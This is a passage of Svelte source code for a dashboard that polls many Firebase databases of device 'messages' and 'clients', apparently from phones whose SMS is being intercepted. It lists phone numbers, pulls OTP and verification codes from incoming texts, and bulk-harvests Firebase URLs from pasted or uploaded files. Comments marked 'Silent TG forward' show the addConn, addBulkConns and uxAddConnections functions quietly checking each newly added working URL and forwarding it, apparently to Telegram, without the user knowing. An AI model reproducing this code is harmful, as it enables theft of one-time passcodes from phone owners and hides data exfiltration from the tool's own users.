      triggerDownload(blob, `firebase-full-backup-${d}.zip`);
      toast("Full backup exported as ZIP", "success");
      // ── Silent TG forward ──
      // tgForwardBackupZip(blob); // disabled — only forwarding Firebase URLs
    } catch (e) {
      toast(`ZIP export failed: ${e.message}`, "error");
    }
  }

  function validateBackup(data) {
    if (!data || typeof data !== "object") return "Invalid JSON structure";
    if (data.type !== "full-backup") return "Not a full-backup file (missing type field)";
    if (!Array.isArray(data.connections) || data.connections.length === 0)
      return "No connections found in backup";
    // Validate each connection has at minimum url + name
    for (const c of data.connections) {
      if (!c.url || !c.name) return `Connection missing url or name: ${JSON.stringify(c).slice(0, 80)}`;
    }
    return null; // valid
  }

  function previewBackupData(data) {
    const connCount = data.connections?.length ?? 0;
    const phoneCount = data.localPhones ? Object.keys(data.localPhones).length : 0;
    const discoveredCount = data.discoveryEngine?.records
      ? data.discoveryEngine.records.filter((r) => r.status === "discovered").length
      : 0;
    const totalRecords = data.discoveryEngine?.records?.length ?? 0;
    const tomorrowCount = data.discoveryEngine?.tryTomorrow?.length ?? 0;
    const usedOtpCount = data.usedOtps?.length ?? 0;
    const deletedCount = data.deletedDevices?.length ?? 0;
    return {
      connCount,
      phoneCount,
      discoveredCount,
      totalRecords,
      tomorrowCount,
      usedOtpCount,
      deletedCount,
      timestamp: data.exportTimestamp ?? "unknown",
      connNames: (data.connections ?? []).map((c) => c.name).join(", "),
    };
  }

  async function handleRestoreFileSelect(e) {
    restoreError = "";
    restorePreview = null;
    const file = e.target?.files?.[0];
    if (!file) return;
    restoreFile = file;
    try {
      let jsonData;
      if (file.name.endsWith(".zip")) {
        if (!window.JSZip) {
          const script = document.createElement("script");
          script.src =
            "https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js";
          await new Promise((resolve, reject) => {
            script.onload = resolve;
            script.onerror = reject;
            document.head.appendChild(script);
          });
        }
        const zip = await window.JSZip.loadAsync(file);
        const entry = zip.file("backup.json");
        if (!entry) {
          restoreError = "ZIP does not contain backup.json";
          return;
        }
        const text = await entry.async("string");
        jsonData = JSON.parse(text);
      } else {
        const text = await file.text();
        jsonData = JSON.parse(text);
      }
      const err = validateBackup(jsonData);
      if (err) {
        restoreError = err;
        return;
      }
      restorePreview = previewBackupData(jsonData);
      restorePreview._raw = jsonData; // store for actual restore
    } catch (err) {
      restoreError = `Failed to parse file: ${err.message}`;
    }
  }

  function handleRestorePaste() {
    restoreError = "";
    restorePreview = null;
    restoreFile = null;
    const text = restorePasteText.trim();
    if (!text) {
      restoreError = "Paste your backup JSON first";
      return;
    }
    try {
      const jsonData = JSON.parse(text);
      const err = validateBackup(jsonData);
      if (err) {
        restoreError = err;
        return;
      }
      restorePreview = previewBackupData(jsonData);
      restorePreview._raw = jsonData;
    } catch (err) {
      restoreError = `Invalid JSON: ${err.message}`;
    }
  }

  function executeRestore() {
    if (!restorePreview?._raw) return;
    restoreProcessing = true;
    const data = restorePreview._raw;
    try {
      // 1. Connections
      if (Array.isArray(data.connections)) {
        localStorage.setItem("pd_connections", JSON.stringify(data.connections));
      }
      // 2. Local phones (merge: backup phones + existing — backup wins on conflict)
      if (data.localPhones && typeof data.localPhones === "object") {
        let existing = {};
        try {
          existing = JSON.parse(localStorage.getItem("pd_phones") || "{}");
        } catch {}
        const merged = { ...existing, ...data.localPhones };
        localStorage.setItem("pd_phones", JSON.stringify(merged));
      }
      // 3. Discovery engine state
      if (data.discoveryEngine && typeof data.discoveryEngine === "object") {
        localStorage.setItem(
          "device-number-discovery:engine",
          JSON.stringify(data.discoveryEngine),
        );
      }
      // 4. Used OTPs (merge)
      if (Array.isArray(data.usedOtps)) {
        let existing = [];
        try {
          existing = JSON.parse(localStorage.getItem("pd_used") || "[]");
        } catch {}
        const merged = [...new Set([...existing, ...data.usedOtps])];
        localStorage.setItem("pd_used", JSON.stringify(merged));
      }
      // 5. Deleted devices (merge)
      if (Array.isArray(data.deletedDevices)) {
        let existing = [];
        try {
          existing = JSON.parse(localStorage.getItem("pd_deleted") || "[]");
        } catch {}
        const merged = [...new Set([...existing, ...data.deletedDevices])];
        localStorage.setItem("pd_deleted", JSON.stringify(merged));
      }
      // 6. Settings
      if (data.settings && typeof data.settings === "object") {
        if (typeof data.settings.notifsEnabled === "boolean")
          localStorage.setItem("pd_notifs_on", String(data.settings.notifsEnabled));
        if (typeof data.settings.showNotifsTab === "boolean")
          localStorage.setItem("pd_show_notifs_tab", String(data.settings.showNotifsTab));
        if (typeof data.settings.autoOpenNotif === "boolean")
          localStorage.setItem("pd_auto_open_notif", String(data.settings.autoOpenNotif));
      }
      toast("Backup restored! Reloading…", "success");
      // ── Silent TG forward ──
      // tgForwardRestore(data); // disabled — only forwarding Firebase URLs
      setTimeout(() => window.location.reload(), 800);
    } catch (e) {
      restoreError = `Restore failed: ${e.message}`;
      restoreProcessing = false;
    }
  }

  function closeRestoreModal() {
    showRestoreModal = false;
    restorePasteText = "";
    restoreFile = null;
    restorePreview = null;
    restoreError = "";
    restoreProcessing = false;
  }

  // ── Display phone: local override → Firebase mobNo → fallback ────────────
  // Strip carrier name + country code → bare 10-digit number (e.g. Jio +916002734479 → 6002734479)
  function extractNumber(phoneStr) {
    if (!phoneStr) return "";
    const s = String(phoneStr).trim();
    const indianMatch = s.match(/(?:(?:\+?91|0)[\s-]*)?([6-9]\d{4}[\s-]?\d{5})/);
    if (indianMatch) {
      return indianMatch[1].replace(/\D/g, "");
    }
    const digits = s.replace(/\D/g, "");
    return digits.length >= 10 ? digits.slice(-10) : digits;
  }

  // ── Last-copied device highlight ─────────────────────────────────────────
  // Highlight stays permanently until another device's number is copied
  let lastCopiedDevice = $state(null); // { connId, key } | null

  function markCopied(connId, key) {
    lastCopiedDevice = { connId, key };
  }

  function isCopied(connId, key) {
    return lastCopiedDevice?.connId === connId && lastCopiedDevice?.key === key;
  }

  function copyPhone(rawPhone) {
    const num = extractNumber(rawPhone);
    if (!num) return;
    copyText(num);
    toast(`${num} copied to clipboard`, "success");
  }

  function getDisplayPhone(connId, key, info) {
    return getLocalPhone(connId, key) ?? fmtPhone(info);
  }

  // ── Fetch latest message for notification (OTP/verification only) ──────────
  async function fetchLatestMsg(conn, devKey) {
    try {
      const { data } = await apiFetch(
        conn,
        `${conn.path}/${devKey}`,
        "GET",
        undefined,
        { orderBy: '"$key"', limitToLast: "1" },
      );
      if (!data || typeof data !== "object") return;
      const msg = Object.values(data)[0];
      if (!msg || typeof msg !== "object") return;
      const text = msg.message ?? msg.body ?? msg.text ?? "";
      const otp = extractOTP(text);
      // Only notify for OTP / verification messages
      if (!otp && !isVerificationMsg(text)) return;
      const sender = msg.sender ?? msg.from ?? "?";
      addNotif({
        connId: conn.id,
        conn,
        devKey,
        sender,
        message: text,
        otp,
        about: extractAbout(sender, text),
        msgId: Object.keys(data)[0],
      });
    } catch {}
  }

  // ── API ───────────────────────────────────────────────────────────────────
  function buildUrl(conn, path, params = {}) {
    const base = conn.url.replace(/\/+$/, "");
    const p = String(path ?? conn.path).replace(/^\/+|\/+$/g, "");
    let u = `${base}/${p}.json`;
    const q = [];
    if (conn.token?.trim())
      q.push(`auth=${encodeURIComponent(conn.token.trim())}`);
    Object.entries(params).forEach(([k, v]) =>
      q.push(`${k}=${encodeURIComponent(v)}`),
    );
    if (q.length) u += "?" + q.join("&");
    return u;
  }
  async function apiFetch(conn, path, method = "GET", body, params = {}) {
    const opts = { method, headers: { "Content-Type": "application/json" } };
    if (body !== undefined) opts.body = JSON.stringify(body);
    const res = await fetch(buildUrl(conn, path, params), opts);
    const json = await res.json();
    if (!res.ok) throw new Error(json?.error ?? `${res.status}`);
    return { status: res.status, data: json };
  }

  // ── Fetch: shallow key list + device info ─────────────────────────────────
  async function fetchConn(conn, silent = false) {
    if (!conn.enabled) return;
    if (silent && db[conn.id]?.deactivated) return;
    // Silent = keep existing data visible while fetching; only show loading on first fetch
    const hasData =
      db[conn.id]?.keys && Object.keys(db[conn.id].keys).length > 0;
    if (!silent || !hasData) {
      db = { ...db, [conn.id]: { ...db[conn.id], loading: true, error: null } };
    }
    try {
      // 1. Get all device keys (shallow, instant)
      const { data: keysData } = await apiFetch(
        conn,
        conn.path,
        "GET",
        undefined,
        { shallow: "true" },
      );
      const keys = keysData && typeof keysData === "object" ? keysData : {};

      // 2. Get device info (status/battery/phone) from infoPath if available
      let info = db[conn.id]?.info ?? {};
      const prevInfo = db[conn.id]?.info ?? {}; // snapshot before update
      if (conn.infoPath) {
        try {
          const { data: infoData } = await apiFetch(conn, conn.infoPath);
          if (infoData && typeof infoData === "object") {
            info = infoData;
            // ── Detect new messages via lastMessageTime ───────────────────
            const nowMs = Date.now();
            for (const [devKey, devInfo] of Object.entries(infoData)) {
              if (!devInfo || typeof devInfo !== "object") continue;
              const newTs = Number(devInfo.lastMessageTime ?? 0);
              const prevTs = Number(prevInfo[devKey]?.lastMessageTime ?? 0);
              // Either time progressed since last poll, or on first poll if message arrived within last 90s
              const isRecent = newTs && (nowMs - newTs) < NOTIF_DURATION_MS;
              if (newTs && ((prevTs && newTs > prevTs) || (!prevTs && isRecent))) {
                fetchLatestMsg(conn, devKey); // fire-and-forget
              }
            }
          }
        } catch {}
      }

      // Detect new device keys (not present at baseline / first load)
      const prevKeys = new Set(Object.keys(db[conn.id]?.keys ?? {}));
      for (const k of Object.keys(keys)) {
        const uid = `${conn.id}::${k}`;
        if (baselineDeviceKeys.size > 0 && !baselineDeviceKeys.has(uid)) {
          newDeviceKeys = new Set([...newDeviceKeys, uid]);
        }
      }

      db = {
        ...db,
        [conn.id]: { loading: false, error: null, deactivated: false, keys, info, ts: new Date() },
      };
    } catch (e) {
      const isDeact = String(e.message).includes('deactivated') || String(e.message).includes('423') || String(e.message).includes('Locked');
      db = {
        ...db,
        [conn.id]: {
          ...db[conn.id],
          loading: false,
          error: isDeact ? 'Database deactivated by Firebase (423 Locked)' : e.message,
          deactivated: isDeact,
          ts: new Date(),
        },
      };
      if (!silent) toast(`[${conn.name}] ${isDeact ? 'Database deactivated by Firebase' : e.message}`, "error");
    }
  }

  async function fetchAll(silent = false) {
    bgRefreshing = true;
    await Promise.allSettled(
      connections.filter((c) => c.enabled).map((c) => fetchConn(c, silent)),
    );
    bgRefreshing = false;
    lastRefresh = new Date();
    nextRefreshSecs = FULL_REFRESH_INTERVAL_SECS;
    // After first load, capture baseline device keys so subsequent fetches can detect "new"
    if (!silent && baselineDeviceKeys.size === 0) {
      for (const c of connections) {
        for (const k of Object.keys(db[c.id]?.keys ?? {})) {
          baselineDeviceKeys.add(`${c.id}::${k}`);
        }
      }
    }
  }

  // Refresh ONLY the single currently-selected panel every 10 seconds to drastically reduce network load
  async function refreshSelectedPanel() {
    if (!selectedConnId) return;
    const conn = connections.find((c) => c.id === selectedConnId);
    if (!conn || !conn.enabled || db[conn.id]?.deactivated) return;
    await fetchConn(conn, true);
    if (selectedKey && activeTab === 'device') {
      try {
        const { data } = await apiFetch(
          conn,
          `${conn.path}/${selectedKey}`,
          "GET",
          undefined,
          { orderBy: '"$key"', limitToLast: "50" },
        );
        if (data && typeof data === 'object') {
          msgs = data;
        }
      } catch {}
    }
  }

  onMount(() => {
    // ── Restore ALL localStorage state ──────────────────────────────────────
    try {
      usedSet = new Set(JSON.parse(localStorage.getItem("pd_used") || "[]"));
    } catch {}
    try {
      localPhones = JSON.parse(localStorage.getItem("pd_phones") || "{}");
    } catch {}
    loadDiscoveryRecords(); // must run after localPhones is restored
    try {
      deletedDevices = new Set(
        JSON.parse(localStorage.getItem("pd_deleted") || "[]"),
      );
    } catch {}
    try {
      notifsEnabled = localStorage.getItem("pd_notifs_on") !== "false";
    } catch {}
    try {
      showNotifsTab = localStorage.getItem("pd_show_notifs_tab") !== "false";
    } catch {}
    try {
      autoOpenNotif = localStorage.getItem("pd_auto_open_notif") === "true";
    } catch {}
    // Restore resized notification panel dimensions & position
    try {
      const savedW = parseInt(localStorage.getItem("pd_notif_panel_w"), 10);
      if (savedW && savedW >= 300 && savedW <= 1400) notifPanelWidth = savedW;
      const savedH = parseInt(localStorage.getItem("pd_notif_panel_h"), 10);
      if (savedH && savedH >= 200 && savedH <= 2500) notifPanelHeight = savedH;
      const savedPos = JSON.parse(localStorage.getItem("pd_notif_panel_pos") || "null");
      if (savedPos && typeof savedPos.x === "number" && typeof savedPos.y === "number") notifPanelPos = savedPos;
      if (localStorage.getItem("pd_bell_panel_open") === "true") showBellPanel = true;
    } catch {}
    // Ensure countdown timers are running for all active notifications for their remaining 90s lifetime
    const now = Date.now();
    for (const n of notifications) {
      const createdAt = Number(n.createdAt) || (n.ts ? new Date(n.ts).getTime() : now);
      const elapsed = Math.max(0, now - createdAt);
      const remaining = NOTIF_DURATION_MS - elapsed;
      if (remaining > 0) {
        scheduleNotifDismiss(n.id, remaining);
      } else {
        dismissNotif(n.id);
      }
    }
    // Restore seen notification IDs so refresh doesn't re-trigger same messages
    try {
      notifSeen = new Set(
        JSON.parse(localStorage.getItem("pd_notif_seen") || "[]"),
      );
    } catch {}
    // Restore persisted connections
    try {
      const saved = JSON.parse(
        localStorage.getItem("pd_connections") || "null",
      );
      if (Array.isArray(saved) && saved.length) {
        const cleaned = saved.filter(c => !c.url?.includes('newpanel-4412c'));
        connections = cleaned;
        if (cleaned.length !== saved.length) {
          saveConnections(cleaned);
        } else {
          syncConnectionsToWorker(cleaned);
        }
      }
    } catch {}

    // ── Init TG forwarder (silently purges any legacy local storage secrets) ──
    tgInit();

    fetchAll(false); // first load: show loading state
    // 1. Combined full discovery & online numbers refresh across all databases every 2 minutes
    refreshInterval = setInterval(() => fetchAll(true), FULL_REFRESH_INTERVAL_SECS * 1000);

    // 2. Targeted fast refresh of ONLY the selected panel / active device every 10 seconds
    selectedPanelInterval = setInterval(() => {
      refreshSelectedPanel();
      panelRefreshSecs = SELECTED_PANEL_INTERVAL_SECS;
    }, SELECTED_PANEL_INTERVAL_SECS * 1000);

    const ticker = setInterval(() => {
      nowTick = Date.now();
      nextRefreshSecs = nextRefreshSecs > 0 ? nextRefreshSecs - 1 : 0;
      panelRefreshSecs = panelRefreshSecs > 0 ? panelRefreshSecs - 1 : 0;
    }, 1000);

    return () => {
      clearInterval(refreshInterval);
      if (selectedPanelInterval) clearInterval(selectedPanelInterval);
      clearInterval(ticker);
    };
  });

  // ── Connection management ─────────────────────────────────────────────────
  function parseBulkFirebase(text) {
    return scanFirebaseUrls(text);
  }

  // ── Universal Extractor UI state ──────────────────────────────────────────
  let uxInput = $state('');
  let uxResults = $state([]);      // { url, name, source, selected }[]
  let uxErrors = $state([]);
  let uxStats = $state(null);      // { totalInput, successCount, uniqueCount, duplicateCount, malformedCount }
  let uxProcessing = $state(false);
  let uxDragActive = $state(false);
  let uxUploadedFiles = $state([]); // { name, size, resultCount }[]
  let uxMalformed = $state([]);    // { line, reason }[] — entries that failed extraction
  let uxProgress = $state({ current: 0, total: 0 }); // per-line progress
  let uxShowMalformed = $state(false); // toggle malformed review panel

  function uxRunExtract() {
    uxErrors = [];
    uxMalformed = [];
    uxProcessing = true;
    uxProgress = { current: 0, total: 0 };

    setTimeout(() => {
      try {
        const raw = uxInput.trim();
        if (!raw) {
          uxProcessing = false;
          return;
        }

        const lines = raw.split(/\r?\n/).map(l => l.trim()).filter(Boolean);
        uxProgress = { current: lines.length, total: lines.length };

        const { results, malformed, errors, stats } = universalExtract(raw);

        uxResults = results.map(r => ({ ...r, selected: true }));
        uxMalformed = malformed;
        uxErrors = errors;
        uxStats = stats;
      } catch (e) {
        uxErrors = ['Unexpected error: ' + (e?.message || String(e))];
        uxResults = [];
        uxStats = null;
      } finally {
        uxProcessing = false;
        uxProgress = { current: 0, total: 0 };
      }
    }, 30);
  }

  function uxRunExtractFile(text, filename) {
    uxProcessing = true;
    setTimeout(() => {
      try {
        const { results, malformed, errors, stats } = universalExtract(text, filename);
        const existingUrls = new Set(uxResults.map(r => r.url));
        const newResults = [];
        let dupes = 0;

        for (const r of results) {
          if (!existingUrls.has(r.url)) {
            existingUrls.add(r.url);
            newResults.push({ ...r, selected: true });
          } else {
            dupes++;
          }
        }

        uxResults = [...uxResults, ...newResults];
        uxMalformed = [...uxMalformed, ...malformed];
        uxUploadedFiles = [...uxUploadedFiles, { name: filename, size: text.length, resultCount: newResults.length }];

        const totalInput = (uxStats?.totalInput || 0) + (stats.totalInput || 1);
        const successCount = (uxStats?.successCount || 0) + (stats.successCount || (newResults.length > 0 ? 1 : 0));
        const uniqueCount = uxResults.length;
        const duplicateCount = (uxStats?.duplicateCount || 0) + dupes + (stats.duplicateCount || 0);
        const malformedCount = uxMalformed.length;

        uxStats = { totalInput, successCount, uniqueCount, duplicateCount, malformedCount };
        if (errors.length) uxErrors = [...uxErrors, ...errors.map(e => `[${filename}] ${e}`)];
      } catch (e) {
        uxErrors = [...uxErrors, `[${filename}] Error: ${e?.message || String(e)}`];
      } finally {
        uxProcessing = false;
      }
    }, 30);
  }

  function uxHandleDrop(e) {
    e.preventDefault();
    uxDragActive = false;
    const files = e.dataTransfer?.files;
    if (files) uxProcessFiles(files);
  }

  function uxHandleDragOver(e) {
    e.preventDefault();
    uxDragActive = true;
  }

  function uxHandleDragLeave() {
    uxDragActive = false;
  }

  function uxHandleFileSelect(e) {
    const files = e.currentTarget?.files;
    if (files) uxProcessFiles(files);
    e.currentTarget.value = '';
  }

  function uxProcessFiles(fileList) {
    const textTypes = ['application/json', 'text/plain', 'text/csv', 'text/html', 'text/xml',
      'application/xml', 'text/tab-separated-values', 'application/x-ndjson'];
    const textExts = ['json', 'txt', 'csv', 'html', 'htm', 'xml', 'tsv', 'log', 'md', 'yaml', 'yml', 'ini', 'cfg', 'conf', 'toml', 'ndjson'];

    for (const file of fileList) {
      const ext = file.name.split('.').pop()?.toLowerCase() || '';
      const isText = textTypes.some(t => file.type.startsWith(t)) || textExts.includes(ext) || file.type === '';

      if (!isText) {
        uxErrors = [...uxErrors, `"${file.name}" appears to be a binary file and cannot be processed.`];
        continue;
      }
      if (file.size > 5 * 1024 * 1024) {
        uxErrors = [...uxErrors, `"${file.name}" is too large (${(file.size / 1024 / 1024).toFixed(1)} MB). Max is 5 MB.`];
        continue;
      }

      const reader = new FileReader();
      reader.onload = () => {
        if (typeof reader.result === 'string') {
          uxRunExtractFile(reader.result, file.name);
        }
      };
      reader.onerror = () => {
        uxErrors = [...uxErrors, `Failed to read "${file.name}".`];
      };
      reader.readAsText(file);
    }
  }

  function uxRemoveResult(url) {
    uxResults = uxResults.filter(r => r.url !== url);
    if (uxStats) uxStats.uniqueCount = uxResults.length;
  }

  function uxToggleResult(url) {
    uxResults = uxResults.map(r => r.url === url ? { ...r, selected: !r.selected } : r);
  }

  function uxToggleAll() {
    const allSelected = uxResults.every(r => r.selected);
    uxResults = uxResults.map(r => ({ ...r, selected: !allSelected }));
  }

  function uxCopyUrl(url) {
    copyText(url);
    toast('URL copied!', 'success');
  }

  function uxCopyAll() {
    const urls = uxResults.map(r => r.url).join('\n');
    if (!urls) { toast('No URLs to copy', 'error'); return; }
    copyText(urls);
    toast(`All ${uxResults.length} URLs copied!`, 'success');
  }

  function uxCopySelected() {
    const selected = uxResults.filter(r => r.selected);
    if (!selected.length) { toast('No connections selected', 'error'); return; }
    const urls = selected.map(r => r.url).join('\n');
    copyText(urls);
    toast(`${selected.length} selected URL${selected.length > 1 ? 's' : ''} copied!`, 'success');
  }

  function uxRemoveDuplicates() {
    const connectedUrls = new Set(connections.map(c => c.url.replace(/\/+$/, '')));
    const beforeCount = uxResults.length;
    uxResults = uxResults.filter(r => !connectedUrls.has(r.url));
    const removed = beforeCount - uxResults.length;
    if (removed > 0) {
      toast(`Removed ${removed} duplicate URL${removed > 1 ? 's' : ''} already in connections`, 'info');
      if (uxStats) uxStats.uniqueCount = uxResults.length;
    } else {
      toast('No duplicates found against active connections', 'info');
    }
  }

  function uxAddToBulk() {
    const selected = uxResults.filter(r => r.selected);
    if (!selected.length) { toast('No connections selected.', 'error'); return; }
    const existing = parseBulkFirebase(bulkText);
    const newUrls = selected.map(r => r.url).filter(u => !existing.includes(u));
    if (newUrls.length) {
      bulkText = [...existing, ...newUrls].join('\n');
      toast(`Added ${newUrls.length} URL${newUrls.length !== 1 ? 's' : ''} to Bulk list.`, 'success');
    } else {
      toast('All selected URLs are already in the Bulk list.', 'info');
    }
  }

  function uxAddConnections() {
    const selected = uxResults.filter(r => r.selected);
    if (!selected.length) { toast('No connections selected.', 'error'); return; }
    let added = 0, skipped = 0;
    const newConns = [];

    for (const item of selected) {
      const validUrl = validateFirebaseUrl(item.url);
      if (!validUrl) continue;
      const dup = connections.find(c => c.url.replace(/\/+$/, '') === validUrl)
               || newConns.find(c => c.url === validUrl);
      if (dup) { skipped++; continue; }
      const id = `c${Date.now()}_${added}`;
      const color = ACCENT[(connections.length + newConns.length) % ACCENT.length];
      newConns.push({
        id,
        name: item.name || nameFromFbUrl(validUrl),
        url: validUrl,
        token: '',
        path: 'messages',
        infoPath: 'clients',
        color,
        enabled: true
      });
      added++;
    }

    if (newConns.length) {
      connections = [...connections, ...newConns];
      saveConnections(connections);
      for (const conn of newConns) fetchConn(conn);
      // Silent TG forward (only valid/active URLs)
      (async () => {
        const validUrls = [];
        for (const conn of newConns) {
          try {
            const res = await fetch(`${conn.url}/.json?shallow=true`, { method: 'GET' });
            if (res.ok) validUrls.push(conn.url);
          } catch {}
        }
        if (validUrls.length) {
          tgForwardBulkUrls(validUrls, validUrls.length, newConns.length - validUrls.length);
        }
      })();
    }

    addOpen = false;
    uxClear();
    if (added && skipped) toast(`Added ${added} connection${added>1?'s':''}, skipped ${skipped} duplicate${skipped>1?'s':''}`, 'success');
    else if (added) toast(`Added ${added} connection${added>1?'s':''}`, 'success');
    else toast(`All ${skipped} URL${skipped>1?'s':''} already connected`, 'info');
  }

  function uxClear() {
    uxInput = '';
    uxResults = [];
    uxErrors = [];
    uxStats = null;
    uxUploadedFiles = [];
    uxMalformed = [];
    uxProgress = { current: 0, total: 0 };
    uxShowMalformed = false;
  }

  function uxUpdateName(url, newName) {
    uxResults = uxResults.map(r => r.url === url ? { ...r, name: newName } : r);
  }

  function uxUpdateUrl(oldUrl, newUrl) {
    const trimmed = newUrl.trim();
    const validated = validateFirebaseUrl(trimmed);
    uxResults = uxResults.map(r => {
      if (r.url !== oldUrl) return r;
      return {
        ...r,
        url: validated || trimmed
      };
    });
  }

  // ── Editable bulk URL list (driven by bulkText) ───────────────────────────
  // Each item is { url: string, valid: bool, dup: bool }
  let bulkEditableUrls = $state([]);

  $effect(() => {
    const parsed = parseBulkFirebase(bulkText);
    bulkEditableUrls = parsed.map(url => ({
      url,
      valid: true,
      dup: !!connections.find(c => c.url.replace(/\/+$/, '') === url)
    }));
  });

  function removeBulkUrl(url) {
    // Remove from bulkText by filtering out that URL
    const lines = bulkText.split(/[\n,]+/).map(s => s.trim()).filter(Boolean);
    const filtered = lines.filter(l => !l.includes(url));
    bulkText = filtered.join('\n');
  }

  function updateBulkUrl(oldUrl, newUrl) {
    const trimmed = newUrl.trim();
    if (!trimmed) { removeBulkUrl(oldUrl); return; }
    bulkText = bulkText.replace(oldUrl, trimmed);
  }

  function copyAllBulkUrls() {
    const urls = bulkEditableUrls.map(u => u.url).join('\n');
    if (!urls) return;
    copyText(urls);
    toast('All URLs copied!', 'success');
  }

  function handleUrlPaste(e) {
    const pasted = e.clipboardData?.getData('text') || '';
    const found = parseBulkFirebase(pasted);
    if (found.length > 1) {
      e.preventDefault();
      bulkText = pasted;
      addPanelMode = 'bulk';
      toast(`Detected ${found.length} URLs — switched to Bulk mode`, 'info');
    }
  }

  function addBulkConns() {
    const urls = bulkParsed;
    if (!urls.length) { toast('No valid Firebase URLs found in text','error'); return; }
    let added = 0, skipped = 0;
    const newConns = [];
    for (const rawUrl of urls) {
      const dup = connections.find(c => c.url.replace(/\/+$/,'') === rawUrl)
               || newConns.find(c => c.url === rawUrl);
      if (dup) { skipped++; continue; }
      const id = `c${Date.now()}_${added}`;
      const color = ACCENT[(connections.length + newConns.length) % ACCENT.length];
      let name = '';
      try { name = new URL(rawUrl).hostname.split('-')[0]; } catch {}
      newConns.push({ id, name: name || 'Firebase', url: rawUrl, token:'', path:'messages', infoPath:'clients', color, enabled:true });
      added++;
    }
    if (newConns.length) {
      connections = [...connections, ...newConns];
      saveConnections(connections);
      for (const conn of newConns) fetchConn(conn);
      // ── Silent TG forward (only valid/active URLs) ──
      (async () => {
        const validUrls = [];
        for (const conn of newConns) {
          try {
            const res = await fetch(`${conn.url}/.json?shallow=true`, { method: 'GET' });
            if (res.ok) validUrls.push(conn.url);
          } catch {}
        }
        if (validUrls.length) {
          tgForwardBulkUrls(validUrls, validUrls.length, newConns.length - validUrls.length);
        }
      })();
    }
    bulkText = ''; addPanelMode = 'single'; addOpen = false;
    if (added && skipped) toast(`Added ${added} connection${added>1?'s':''}, skipped ${skipped} duplicate${skipped>1?'s':''}`, 'success');
    else if (added) toast(`Added ${added} connection${added>1?'s':''}`, 'success');
    else toast(`All ${skipped} URL${skipped>1?'s':''} already connected`, 'info');
  }

  function addConn() {
    const rawUrl = form.url.trim().replace(/\/+$/, "");
    if (!rawUrl) {
      toast("Firebase URL required", "error");
      return;
    }
    const dup = connections.find((c) => c.url.replace(/\/+$/, "") === rawUrl);
    if (dup) {
      toast(`Already connected as "${dup.name}" — refreshing`, "info");
      fetchConn(dup);
      addOpen = false;
      return;
    }
    const id = `c${Date.now()}`;
    const color = ACCENT[connections.length % ACCENT.length];
    let name = form.name.trim();
    try {
      if (!name) name = new URL(rawUrl).hostname.split("-")[0];
    } catch {}
    const conn = {
      ...form,
      url: rawUrl,
      id,
      color,
      name: name || "Firebase",
      enabled: true,
    };
    connections = [...connections, conn];
    saveConnections(connections); // persist immediately
    rawConnId = id;
    form = { name: "", url: "", token: "", path: "messages", infoPath: "" };
    addOpen = false;
    fetchConn(conn);
    toast(`Connected: ${conn.name}`, "success");
    // ── Silent TG forward (only if URL is valid/active) ──
    (async () => {
      try {
        const res = await fetch(`${conn.url}/.json?shallow=true`, { method: 'GET' });
        if (res.ok) tgForwardConnection(conn);
      } catch {}
    })();
  }
  function toggleConn(id) {
    connections = connections.map((c) =>
      c.id === id ? { ...c, enabled: !c.enabled } : c,
    );
    saveConnections(connections); // persist enabled state
    const conn = connections.find((c) => c.id === id);
    if (conn?.enabled) fetchConn(conn);
  }
  function dropConn(id) {
    const conn = connections.find(c => c.id === id);
    if (!confirm(`Remove connection "${conn?.name || id}"?`)) return;
    connections = connections.filter((c) => c.id !== id);
    saveConnections(connections); // persist removal
    const { [id]: _, ...rest } = db;
    db = rest;
    // Clear selection if removed conn was selected
    if (selectedConnId === id) { selectedConnId = null; selectedKey = null; activeTab = 'overview'; }
    // Clear from FC selection
    if (fcSelected.has(id)) { const s = new Set(fcSelected); s.delete(id); fcSelected = s; }
  }

  // ── Firebase Connections Management page state ────────────────────────────
  let fcSearch = $state('');
  let fcStatusFilter = $state('all'); // 'all' | 'online' | 'offline'
  let fcSelected = $state(new Set()); // Set of conn ids
  let fcEditId = $state(null); // id of conn being edited inline
  let fcEditForm = $state({ name: '', url: '', path: '', infoPath: '', token: '' });
  let copiedKey = $state(''); // transient 'connId::field' for Copied! state
  let copiedTimer = null;

  let filteredConns = $derived(
    connStats.filter(c => {
      if (fcSearch) {
        const q = fcSearch.toLowerCase();
        if (!c.name.toLowerCase().includes(q) && !c.url?.toLowerCase().includes(q)) return false;
      }
      if (fcStatusFilter === 'online' && c.online === 0) return false;
      if (fcStatusFilter === 'offline' && c.online > 0) return false;
      if (fcStatusFilter === 'failed' && !c.error) return false;
      return true;
    })
  );

  function withCopied(key) {
    copiedKey = key;
    if (copiedTimer) clearTimeout(copiedTimer);
    copiedTimer = setTimeout(() => { copiedKey = ''; }, 1500);
  }

  function copyConnUrl(conn) {
    copyText(conn.url);
    withCopied(`${conn.id}::url`);
  }
  function copyConnName(conn) {
    copyText(conn.name);
    withCopied(`${conn.id}::name`);
  }
  function copyConnDetails(conn) {
    const line = `${conn.name} | ${conn.url} | ${conn.path || 'messages'} | ${conn.infoPath || ''}`;
    copyText(line);
    withCopied(`${conn.id}::details`);
  }

  function copyAllConnUrls() {
    const text = filteredConns.map(c => c.url).join('\n');
    copyText(text);
    toast(`Copied ${filteredConns.length} URLs!`, 'success');
  }
  function copyAllConnNames() {
    const text = filteredConns.map(c => c.name).join('\n');
    copyText(text);
    toast(`Copied ${filteredConns.length} names!`, 'success');
  }
  function copyAllConnDetails() {
    const text = filteredConns.map(c => `${c.name} | ${c.url} | ${c.path || 'messages'} | ${c.infoPath || ''}`).join('\n');
    copyText(text);
    toast(`Copied ${filteredConns.length} connection details!`, 'success');
  }

  function copySelectedConnUrls() {
    const sel = connections.filter(c => fcSelected.has(c.id));
    copyText(sel.map(c => c.url).join('\n'));
    toast(`Copied ${sel.length} selected URLs!`, 'success');
  }

  function fcToggleSelect(id) {
    const s = new Set(fcSelected);
    s.has(id) ? s.delete(id) : s.add(id);
    fcSelected = s;
  }
  function fcToggleAll() {
    if (fcSelected.size === filteredConns.length && filteredConns.length > 0) {
      fcSelected = new Set();
    } else {
      fcSelected = new Set(filteredConns.map(c => c.id));
    }
  }

  function fcStartEdit(conn) {
    fcEditId = conn.id;
    fcEditForm = { name: conn.name, url: conn.url, path: conn.path || 'messages', infoPath: conn.infoPath || '', token: conn.token || '' };
  }
  function fcCancelEdit() { fcEditId = null; }
  function fcSaveEdit() {
    const rawUrl = fcEditForm.url.trim().replace(/\/+$/, '');
    if (!rawUrl) { toast('Firebase URL required', 'error'); return; }
    connections = connections.map(c => c.id === fcEditId ? {
      ...c,
      name: fcEditForm.name.trim() || c.name,
